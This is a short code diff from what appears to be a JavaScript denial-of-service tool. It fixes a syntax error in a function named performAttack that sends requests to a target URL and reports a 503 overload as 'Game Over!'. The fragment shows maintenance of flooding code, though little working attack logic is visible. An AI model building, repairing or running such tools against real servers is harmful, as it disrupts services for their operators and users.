@@ -205,9 +205,9 @@ const performAttack = (url, agent) => {
             headers: headersForRequest,
             timeout: 0,
         })
-        .then((
-            console.log(rainbow("SERVER STILL ALIVE!"))
-        ) => {})
+        .then(() => {
+            console.log(rainbow("SERVER STILL ALIVE!"));        
+        })
         .catch((err) => {
             if (err.response?.status === 503) {
                 console.log(rainbow("Target under heavy load (503) - Game Over!"));
